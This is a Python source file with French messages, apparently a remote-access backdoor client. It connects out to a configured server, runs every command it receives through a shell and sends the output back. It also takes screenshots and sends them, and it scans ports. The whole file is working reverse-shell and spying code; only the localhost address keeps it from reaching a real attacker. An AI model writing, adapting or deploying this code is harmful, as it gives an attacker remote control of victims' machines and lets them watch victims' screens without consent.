import socket
import subprocess
import pyautogui
import io

ip_address = '127.0.0.1'
port_number = 1234

def connect_to_server():
    cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cs.connect((ip_address, port_number))
    print("Connecté au serveur :)")

    while True:
        try:
            command = cs.recv(1024).decode()
            if command.lower() == 'quit':
                break
            elif command.lower() == 'screenshot':
                screenshot = pyautogui.screenshot()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                buffer.seek(0)

                cs.send(str(len(buffer.getvalue())).encode())  # Taille de l'image
                cs.recv(1024)

                cs.sendall(buffer.getvalue())
                continue
            elif command.startswith("scan"):
                parts = command.split()
                if len(parts) != 3:
                    cs.send("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>".encode())
                    continue
                _, start_port, end_port = parts
                open_ports = scan_ports(int(start_port), int(end_port))
                output = f"Ports ouverts sur {ip_address}: {open_ports}"
                cs.send(output.encode())
                continue

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "Commande exécutée, pas de sortie !"
            cs.send(output.encode())
        except Exception as e:
            cs.send(f"Error: {e}".encode())
            print(f"Erreur : {e}")
            break

    cs.close()

def scan_ports(start_port, end_port):

    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)  # Timeout de 1 seconde
            result = sock.connect_ex((ip_address, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except Exception as e:
            pass
    return open_ports

if __name__ == "__main__":
    connect_to_server()
